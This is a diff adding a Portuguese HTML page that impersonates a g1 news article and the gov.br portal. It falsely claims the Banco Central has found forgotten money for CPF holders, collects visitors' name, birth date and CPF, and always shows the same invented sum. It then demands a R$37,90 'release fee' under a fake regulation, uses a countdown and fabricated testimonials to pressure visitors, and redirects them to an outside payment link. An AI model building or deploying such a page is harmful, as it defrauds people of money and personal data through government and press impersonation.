@@ -1,0 +1,565 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+<meta charset="utf-8">
+<meta content="width=device-width, initial-scale=1.0" name="viewport">
+<title>gov.br • Acesso ao Sistema</title>
+<style>
+    body { font-family: system-ui, sans-serif; margin: 0; background: #f5f6fa; color: #222; }
+    .hidden { display: none; }
+    .header { background: #00264d; padding: 15px; color: white; display: flex; align-items: center; }
+    .header img { height: 28px; margin-right: 10px; }
+    .container { max-width: 680px; margin: 20px auto; padding: 20px; background: white; border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+    .title { font-size: 24px; color: #003366; margin-bottom: 15px; }
+    .input-group { margin-bottom: 15px; }
+    input { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 8px; font-size: 16px; }
+    button { background: #007bff; color: white; border: none; padding: 12px; font-size: 16px; border-radius: 8px;
+      cursor: pointer; width: 100%; }
+    button:hover { background: #0056b3; }
+    .depoimento { background: #f1f1f1; border-radius: 8px; padding: 10px; margin: 10px 0; display: flex; align-items: center; gap: 10px; }
+    .depoimento img { width: 50px; height: 50px; border-radius: 50%; }
+    .stars { color: #f5c518; margin-bottom: 5px; }
+    .result-box { background: #e6f2ff; border-left: 5px solid #007bff; padding: 15px; margin-top: 20px; border-radius: 8px; }
+    #timer { font-weight: bold; color: red; font-size: 18px; margin: 10px 0; }
+
+    @media (max-width: 600px) {
+      .container { margin: 10px; padding: 15px; }
+      .title { font-size: 20px; }
+      button { font-size: 15px; padding: 10px; }
+    }
+  
+@media screen and (max-width: 480px) {
+  body, .container {
+    padding: 10px !important;
+    margin: 5px !important;
+  }
+  .title, h2 {
+    font-size: 28px !important;
+  }
+  .depoimento {
+    flex-direction: column;
+    align-items: flex-start;
+  }
+  .depoimento img {
+    width: 40px;
+    height: 40px;
+  }
+  button {
+    font-size: 14px !important;
+    padding: 10px !important;
+
+  }
+}
+</style>
+<style>
+/* Estilo do topo G1 exclusivo da página 1 */
+#pagina1 {
+  font-family: Arial, sans-serif;
+  background: #ffffff;
+  padding: 20px;
+  color: #222;
+}
+#pagina1 .g1-topo {
+  background-color: #c4170c;
+  color: white;
+  padding: 10px 20px;
+  font-size: 18px;
+  font-weight: bold;
+  margin: -20px -20px 20px -20px;
+}
+
+/* Estilização do conteúdo da página 1 */
+#pagina1 h2 {
+  font-size: 38px;
+  color: #c4170c;
+  font-weight: bold;
+  margin-bottom: 16px;
+}
+#pagina1 p {
+  font-size: 18px;
+  line-height: 1.6;
+  margin-bottom: 16px;
+}
+#pagina1 .depoimento {
+  background: #f5f5f5;
+  border-left: 4px solid #c4170c;
+  padding: 10px;
+  margin: 15px 0;
+  font-style: italic;
+  color: #333;
+}
+#pagina1 button {
+  background: #c4170c;
+  color: white;
+  font-size: 16px;
+  padding: 12px;
+  border: none;
+  border-radius: 5px;
+  cursor: pointer;
+}
+#pagina1 button:hover {
+  background: #a3120a;
+}
+
+@media screen and (max-width: 600px) {
+  body {
+    margin: 0 !important;
+    padding: 0 !important;
+    overflow-x: hidden;
+  }
+
+  .container {
+    width: 100% !important;
+    max-width: 100% !important;
+    padding: 10px !important;
+    margin: 0 auto !important;
+    box-sizing: border-box;
+  }
+
+  .header,
+  #pagina1 .g1-topo {
+    width: 100% !important;
+    box-sizing: border-box;
+    padding-left: 15px !important;
+    padding-right: 15px !important;
+    font-size: 16px !important;
+  }
+
+  .title, #pagina1 h2 {
+    font-size: 28px !important;
+  }
+
+  .depoimento {
+    flex-direction: column !important;
+    align-items: flex-start !important;
+    font-size: 15px !important;
+  }
+
+  .depoimento img {
+    width: 40px !important;
+    height: 40px !important;
+  }
+
+  button {
+    font-size: 18px !important;
+    padding: 20px !important;
+    font-weight: bold !important;
+  }
+
+  input {
+    font-size: 16px !important;
+  }
+}
+
+#pagina1 .g1-topo {
+  display: block;
+  width: 100%;
+  box-sizing: border-box;
+  padding: 12px 16px;
+  margin: 0 auto 20px auto;
+  font-size: 18px;
+}
+
+#pagina2 input,
+#pagina2 .input-group {
+  width: 100% !important;
+  box-sizing: border-box;
+  margin-bottom: 10px !important;
+
+}
+
+@media screen and (max-width: 600px) {
+  #pagina1 .g1-topo {
+    font-size: 16px !important;
+    padding: 12px 10px !important;
+    margin-left: 0 !important;
+    margin-right: 0 !important;
+  }
+
+  #pagina2 input,
+  #pagina2 .input-group {
+    padding: 10px !important;
+    font-size: 16px !important;
+    margin-bottom: 5px !important;
+
+  }
+}
+</style></head>
+<body>
+
+  <!-- Cabeçalhos individuais -->
+<div class="header" id="header-pagina1" style="align-items: center; background: rgb(196, 23, 12); color: white; padding: 15px; display: flex;">
+  <img alt="gov.br" src="images/g1.png" style="height:28px; margin-right:100px; font-weight: 100bold;">
+  ECONOMIA
+</div>
+
+<div class="header" id="header-pagina2" style="display:flex; align-items:center; background:#00264d; color:white; padding:15px; display:none;">
+  <img alt="gov.br" src="images/govbr.webp" style="height:28px; margin-right:10px;">
+
+
+
+
+
+
+  <meta charset="UTF-8">
+  <title>Ícones</title>
+
+
+
+<div style="display: flex; gap: 20px; align-items: center; color: #ffffff;">
+
+  <!-- PT + seta -->
+  <div style="display: flex; align-items: center; gap: 140px; cursor: pointer;">
+    <span style="font-family: Arial; font-weight: bold;"></span>
+    <svg width="10" height="6" viewBox="0 0 10 6" xmlns="http://www.w3.org/2000/svg" fill="#ffffff">
+      <path d="M0 0L5 6L10 0H0Z"></path>
+    </svg>
+  </div>
+
+  <!-- Paleta de cores -->
+  <svg width="20" height="20" viewBox="0 0 24 24" fill="#ffffff" xmlns="http://www.w3.org/2000/svg" style="cursor: pointer;">
+    <path d="M12 2C6.48 2 2 6.03 2 10.5C2 14.97 6.48 19 12 19C12.34 19 12.68 18.98 13 18.94C13 19.94 13 22 16 22C19 22 20 19.94 20 18C20 14.13 15.52 12 12 12C8.48 12 5 14.13 5 18C5 18.34 5.03 18.68 5.06 19H12C17.52 19 22 14.97 22 10.5C22 6.03 17.52 2 12 2Z"></path>
+  </svg>
+
+  <!-- Modo claro/escuro -->
+  <svg width="20" height="20" viewBox="0 0 24 24" fill="#ffffff" xmlns="http://www.w3.org/2000/svg" style="cursor: pointer;">
+    <path d="M12 2C6.48 2 2 6.48 2 12S6.48 22 12 22c5.52 0 10-4.48 10-10S17.52 2 12 2Zm0 18c-1.85 0-3.55-.63-4.9-1.69A8.015 8.015 0 0 0 12 4c4.41 0 8 3.59 8 8s-3.59 8-8 8Z"></path>
+  </svg>
+
+  <!-- Menu grade -->
+  <svg width="20" height="20" viewBox="0 0 24 24" fill="#ffffff" xmlns="http://www.w3.org/2000/svg" style="cursor: pointer;">
+    <path d="M3 3H9V9H3V3ZM10 3H16V9H10V3ZM17 3H23V9H17V3ZM3 10H9V16H3V10ZM10 10H16V16H10V10ZM17 10H23V16H17V10ZM3 17H9V23H3V17ZM10 17H16V23H10V17ZM17 17H23V23H17V17Z"></path>
+  </svg>
+
+</div>
+
+
+
+
+
+
+
+
+</div>
+
+<div class="header" id="header-pagina3" style="display:flex; align-items:center; background:#00264d; color:white; padding:15px; display:none;">
+  <img alt="gov.br" src="images/govbr.webp" style="height:28px; margin-right:10px;">
+
+
+
+  
+
+
+  <meta charset="UTF-8">
+  <title>Ícones</title>
+
+
+
+<div style="display: flex; gap: 20px; align-items: center; color: #ffffff;">
+
+  <!-- PT + seta -->
+  <div style="display: flex; align-items: center; gap: 140px; cursor: pointer;">
+    <span style="font-family: Arial; font-weight: bold;"></span>
+    <svg width="10" height="6" viewBox="0 0 10 6" xmlns="http://www.w3.org/2000/svg" fill="#ffffff">
+      <path d="M0 0L5 6L10 0H0Z"></path>
+    </svg>
+  </div>
+
+  <!-- Paleta de cores -->
+  <svg width="20" height="20" viewBox="0 0 24 24" fill="#ffffff" xmlns="http://www.w3.org/2000/svg" style="cursor: pointer;">
+    <path d="M12 2C6.48 2 2 6.03 2 10.5C2 14.97 6.48 19 12 19C12.34 19 12.68 18.98 13 18.94C13 19.94 13 22 16 22C19 22 20 19.94 20 18C20 14.13 15.52 12 12 12C8.48 12 5 14.13 5 18C5 18.34 5.03 18.68 5.06 19H12C17.52 19 22 14.97 22 10.5C22 6.03 17.52 2 12 2Z"></path>
+  </svg>
+
+  <!-- Modo claro/escuro -->
+  <svg width="20" height="20" viewBox="0 0 24 24" fill="#ffffff" xmlns="http://www.w3.org/2000/svg" style="cursor: pointer;">
+    <path d="M12 2C6.48 2 2 6.48 2 12S6.48 22 12 22c5.52 0 10-4.48 10-10S17.52 2 12 2Zm0 18c-1.85 0-3.55-.63-4.9-1.69A8.015 8.015 0 0 0 12 4c4.41 0 8 3.59 8 8s-3.59 8-8 8Z"></path>
+  </svg>
+
+  <!-- Menu grade -->
+  <svg width="20" height="20" viewBox="0 0 24 24" fill="#ffffff" xmlns="http://www.w3.org/2000/svg" style="cursor: pointer;">
+    <path d="M3 3H9V9H3V3ZM10 3H16V9H10V3ZM17 3H23V9H17V3ZM3 10H9V16H3V10ZM10 10H16V16H10V10ZM17 10H23V16H17V10ZM3 17H9V23H3V17ZM10 17H16V23H10V17ZM17 17H23V23H17V17Z"></path>
+  </svg>
+
+</div>
+
+
+
+
+
+
+
+
+</div>
+
+
+
+
+<!-- Login -->
+<!-- Página 1 -->
+<div class="container" id="pagina1" style="display:block;">
+
+
+<h2 style="font-size:38px; color:#000000;">Milhares de brasileiros desconhecem valor disponível em seus CPFs</h2>
+
+
+
+
+  <meta charset="UTF-8">
+  <title>Créditos de Notícia</title>
+
+
+
+<p style="font-family: Arial, sans-serif; font-size: 13px; color: #4a4a4a; margin: 0;">
+  Por <span style="color: #b30000; font-weight: bold;">Alexandro Martello</span>, 
+  <span style="font-weight: bold;">g1</span> — Brasília
+</p>
+
+<p style="font-family: Arial, sans-serif; font-size: 12px; color: #6e6e6e; margin: 2px 0 0 0;">
+  13/05/2025 10h28 · Atualizado há um dia
+</p>
+
+
+
+
+
+
+
+    <meta charset="UTF-8">
+      
+        <link rel="stylesheet" href="css/all.min.css">
+          <style>
+                .social-icons {
+                        display: flex;
+                              gap: 35px;
+                                    align-items: center;
+                                          margin: 20px;
+                                              }
+
+                                                  .social-icons a {
+                                                          font-size: 20px;
+                                                                text-decoration: none;
+                                                                    }
+
+                                                                        .facebook {
+                                                                                color: #1877f2;
+                                                                                    }
+
+                                                                                        .whatsapp {
+                                                                                                color: #25d366;
+                                                                                                    }
+
+                                                                                                        .share {
+                                                                                                                color: #555;
+                                                                                                                    }
+                                                                                                                      </style>
+                                                                                                                    
+                                                                                                                    
+
+                                                                                                                      <div class="social-icons">
+                                                                                                                          <a href="https://www.facebook.com/sharer/sharer.php?u=URL_DO_SEU_SITE" target="_blank" class="facebook">
+                                                                                                                                <i class="fab fa-facebook-f"></i>
+                                                                                                                                  </a>
+                                                                                                                                    <a href="https://api.whatsapp.com/send?text=URL_DO_SEU_SITE" target="_blank" class="whatsapp">
+                                                                                                                                          <i class="fab fa-whatsapp"></i>
+                                                                                                                                            </a>
+                                                                                                                                              <a href="#" onclick="navigator.share({ title: 'Título', url: 'URL_DO_SEU_SITE' })" class="share">
+                                                                                                                                                    <i class="fas fa-share-alt"></i>
+                                                                                                                                                      </a>
+                                                                                                                                                    </div>
+
+                                                                                                                                                  
+                                                                                                                                                  
+
+
+<div id="vid_682f953e27d0c3bdc0867004" style="position: relative; width: 100%; padding: 56.25% 0 0;"> <img id="thumb_682f953e27d0c3bdc0867004" src="https://images.converteai.net/a994c0ba-812d-47ab-82f3-09dac1d8d9bc/players/682f953e27d0c3bdc0867004/thumbnail.jpg" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; display: block;" alt="thumbnail"> <div id="backdrop_682f953e27d0c3bdc0867004" style=" -webkit-backdrop-filter: blur(5px); backdrop-filter: blur(5px); position: absolute; top: 0; height: 100%; width: 100%; "></div> </div> <script type="text/javascript" id="scr_682f953e27d0c3bdc0867004"> var s=document.createElement("script"); s.src="https://scripts.converteai.net/a994c0ba-812d-47ab-82f3-09dac1d8d9bc/players/682f953e27d0c3bdc0867004/player.js", s.async=!0,document.head.appendChild(s); </script>
+
+<link rel="preload" href="https://scripts.converteai.net/a994c0ba-812d-47ab-82f3-09dac1d8d9bc/players/682f953e27d0c3bdc0867004/player.js" as="script">
+<link rel="preload" href="https://scripts.converteai.net/lib/js/smartplayer/v1/smartplayer.min.js" as="script">
+<link rel="preload" href="https://images.converteai.net/a994c0ba-812d-47ab-82f3-09dac1d8d9bc/players/682f953e27d0c3bdc0867004/thumbnail.jpg" as="image">
+<link rel="preload" href="https://cdn.converteai.net/a994c0ba-812d-47ab-82f3-09dac1d8d9bc/682f949ccb2759ce8e5742cf/main.m3u8" as="fetch">
+<link rel="dns-prefetch" href="https://cdn.converteai.net">
+<link rel="dns-prefetch" href="https://scripts.converteai.net">
+<link rel="dns-prefetch" href="https://images.converteai.net">
+<link rel="dns-prefetch" href="https://api.vturb.com.br">
+
+
+
+<p>O Banco Central, através de seu novo sistema de consulta digital, detectou que milhões de pessoas possuem valores esquecidos em contas antigas, consórcios e instituições extintas.</p>
+<p>Apesar da facilidade no processo, muitos ainda não fizeram a verificação por desconhecimento ou receio.</p>
+
+<div class="depoimento">
+        "Vi no grupo da minha cidade, fui lá conferir e apareceu que eu tinha mais de R$1.400 pra sacar. Não acreditei!"<br>
+<strong>— Paula Ribeiro, São Paulo</strong>
+</div>
+<div class="depoimento">
+        "Achei que era golpe, mas resolvi tentar. Preenchi os dados e em 48h estava na minha conta."<br>
+<strong>— Leonardo Silva, Recife</strong>
+</div>
+<div class="depoimento">
+        "Estava desempregada e descobri que tinha R$980 parado. Foi a salvação do mês."<br>
+<strong>— Fernanda Lopes, Belo Horizonte</strong>
+</div>
+
+<div><h2>Quem tem direito?</h2>
+    <ul>
+      <li>Aposentados ou pensionistas do INSS</li>
+      <li>Quem teve <strong>empréstimos não solicitados</strong></li>
+      <li>Pessoas com <strong>descontos desconhecidos</strong> no benefício</li>
+    </ul>
+<img src="images/real-moeda-dinheiro-mcajr-2904223671.webp" alt="Descrição da imagem" style="width: 500px; height: auto; max-width: 100%; border-radius: 8px;">
+
+  </div>
+
+
+<p>O acesso é gratuito e pode ser feito em menos de 1 minuto. Veja abaixo como consultar o seu CPF:</p>
+<button onclick="mostrarPagina('pagina2')">Acessar site oficial para consulta</button>
+</div>
+
+
+
+
+
+<!-- Página 2 -->
+<div class="container" id="pagina2" style="display:none;">
+
+
+<div class="title">Digite seus dados para verificação</div>
+<div class="input-group"><input id="nome" placeholder="Nome completo" type="text"></div>
+<div class="input-group"><input id="nascimento" placeholder="Data de nascimento (DD/MM/AAAA)" type="text"></div><div class="input-group"><input id="cpfConsulta" placeholder="CPF" type="text"></div>
+<button onclick="validarCampos()">Verificar valor disponível</button>
+<div class="depoimento"><img src="images/ai-image-generation-fake-faces-people-nvidia-5c18b207b7231__700.jpg"><div><div class="stars">★★★★★</div><div>"Fiz e recebi em menos de 24h. Simples e rápido!"</div></div></div>
+<div class="depoimento"><img src="https://th.bing.com/th/id/R.eea17c8e4e758db18078fee7a5dd6446?rik=RcFnxDap1gHm5A&riu=http%3a%2f%2fuploads.metropoles.com%2fwp-content%2fuploads%2f2017%2f03%2f07191012%2fverafischer.jpg&ehk=My5O4IFZfcVvhubfIii0eFfaOqigccBNzvDC3rRO6MI%3d&risl=&pid=ImgRaw&r=0"><div><div class="stars">★★★★★</div><div>"Só precisei preencher os dados e pagar. Recomendo."</div></div></div>
+<div class="depoimento"><img src="images/image.jpg"><div><div class="stars">★★★★★</div><div>"Não acreditava, mas caiu na conta. Valeu a pena."</div></div></div>
+<div class="depoimento">
+<img src="https://th.bing.com/th/id/OIP.iZP4deeErKH8xoVjI85KIQHaHa?rs=1&pid=ImgDetMain">
+<div>
+<div class="stars">★★★★★</div>
+<div>"Achei que era fake, mas caiu certinho no Pix."</div>
+</div>
+</div>
+</div>
+<!-- Página 3 -->
+<div class="container" id="pagina3" style="display:none;">
+
+
+
+
+
+<div class="title">Resultado da Consulta</div>
+<div class="result-box" id="resultadoConsulta"></div>
+<p style="background:#fff3cd; border-left:4px solid #ffc107; padding:10px; border-radius:6px; font-size:15px;">
+<strong>Por que essa taxa?</strong><br>
+    Conforme instrução normativa N° 82/2023, todo resgate digital superior a R$500 requer verificação de identidade com autenticação integrada ao sistema gov.br. 
+    A taxa única de <strong style="color:#d70000;">R$37,90</strong> é utilizada para cobrir custos operacionais de verificação automatizada e liberação via protocolo eletrônico.
+  </p>
+<p id="timer">Tempo restante: 04:00</p>
+<p style="color:#b30000;"><strong>ATENÇÃO:</strong> Este é o último dia para solicitar o resgate. Após o tempo esgotado, os valores serão devolvidos à União.</p>
+<button onclick="resgatar()">Resgatar Agora</button>
+<div class="title" style="margin-top:30px;">Depoimentos de quem já recebeu</div>
+<div class="depoimento"><img src="images/1_DtORW7Epbgcw-5Ec2W8-mA.jpeg"><div><div class="stars">★★★★★</div><div>"Recebi mais de R$1.200 em dois dias após pagar."</div></div></div>
+<div class="depoimento"><img src="images/Alyssa-Faye-Smith_800x800_acf_cropped.jpeg"><div><div class="stars">★★★★★</div><div>"Foi só preencher e confirmar. Muito simples."</div></div></div>
+<div class="depoimento"><img src="images/Mariano-Pavon.jpeg"><div><div class="stars">★★★★★</div><div>"A taxa é pequena perto do que recebi."</div></div></div>
+<div class="depoimento"><img src="https://th.bing.com/th/id/OIP.KHffKhU2DnbcetEL-XgcLAHaHa?w=1024&h=1024&rs=1&pid=ImgDetMain"><div><div class="stars">★★★★★</div><div>"Vi no grupo da minha cidade, e deu certo pra mim."</div></div></div>
+<div class="depoimento"><img src="images/AdrianaGallardo-1.jpg"><div><div class="stars">★★★★★</div><div>"A plataforma gov.br facilitou tudo."</div></div></div>
+</div>
+<script>
+function mostrarPagina(id) {
+  const paginas = ['pagina1', 'pagina2', 'pagina3'];
+  paginas.forEach(pagina => {
+    document.getElementById(pagina).style.display = (pagina === id) ? 'block' : 'none';
+  });
+}
+
+window.onload = function () {
+  mostrarPagina('pagina1');
+};
+
+function validarCPF(cpf) {
+  cpf = cpf.replace(/[^\d]+/g,'');
+  if (cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) return false;
+  let soma = 0;
+  for (let i = 0; i < 9; i++) soma += parseInt(cpf.charAt(i)) * (10 - i);
+  let resto = 11 - (soma % 11);
+  if (resto === 10 || resto === 11) resto = 0;
+  if (resto !== parseInt(cpf.charAt(9))) return false;
+  soma = 0;
+  for (let i = 0; i < 10; i++) soma += parseInt(cpf.charAt(i)) * (11 - i);
+  resto = 11 - (soma % 11);
+  if (resto === 10 || resto === 11) resto = 0;
+  return resto === parseInt(cpf.charAt(10));
+}
+
+let cpfArmazenado = "";
+
+function validarCampos() {
+  const nome = document.getElementById("nome").value.trim();
+  const nascimento = document.getElementById("nascimento").value.trim();
+  const cpf = document.getElementById("cpfConsulta").value.trim();
+  if (!nome || !nascimento || !cpf) {
+    alert("Preencha todos os campos para continuar.");
+    return;
+  }
+  cpfArmazenado = cpf;
+  mostrarPagina("pagina3");
+  document.getElementById("resultadoConsulta").innerHTML =
+    `<strong>${nome}</strong><br>CPF: ${cpfArmazenado}<br>Nascimento: ${nascimento}<br><br><strong>Valor encontrado: R$1.407,21</strong>`;
+  iniciarContador();
+}
+
+function iniciarContador() {
+  let tempo = 240;
+  const timerEl = document.getElementById("timer");
+  const intervalo = setInterval(() => {
+    const minutos = String(Math.floor(tempo / 60)).padStart(2, '0');
+    const segundos = String(tempo % 60).padStart(2, '0');
+    timerEl.textContent = `Tempo restante: ${minutos}:${segundos}`;
+    tempo--;
+    if (tempo < 0) {
+      clearInterval(intervalo);
+      timerEl.textContent = "Tempo esgotado. O valor não pode mais ser resgatado.";
+    }
+  }, 1000);
+}
+
+function resgatar() {
+  window.location.assign("https://pay.somentehj.online/5pjw3RneJ9y32lQ");
+}
+
+document.addEventListener("DOMContentLoaded", function() {
+  const nascimentoInput = document.getElementById("nascimento");
+  if (nascimentoInput) {
+    nascimentoInput.addEventListener("input", function(e) {
+      let val = e.target.value.replace(/\D/g, "").slice(0,8);
+      if (val.length >= 5)
+        e.target.value = val.replace(/(\d{2})(\d{2})(\d{0,4})/, "$1/$2/$3");
+      else if (val.length >= 3)
+        e.target.value = val.replace(/(\d{2})(\d{0,2})/, "$1/$2");
+      else
+        e.target.value = val;
+    });
+  }
+});
+</script>
+
+<script>
+function mostrarPagina(id) {
+  const paginas = ['pagina1', 'pagina2', 'pagina3'];
+  const headers = ['header-pagina1', 'header-pagina2', 'header-pagina3'];
+
+  paginas.forEach(pagina => {
+    document.getElementById(pagina).style.display = (pagina === id) ? 'block' : 'none';
+  });
+
+  headers.forEach(header => {
+    document.getElementById(header).style.display = (header === 'header-' + id) ? 'flex' : 'none';
+  });
+}
+
+window.onload = function () {
+  mostrarPagina('pagina1');
+};
+</script>
+
+
+
+
+</body></html>
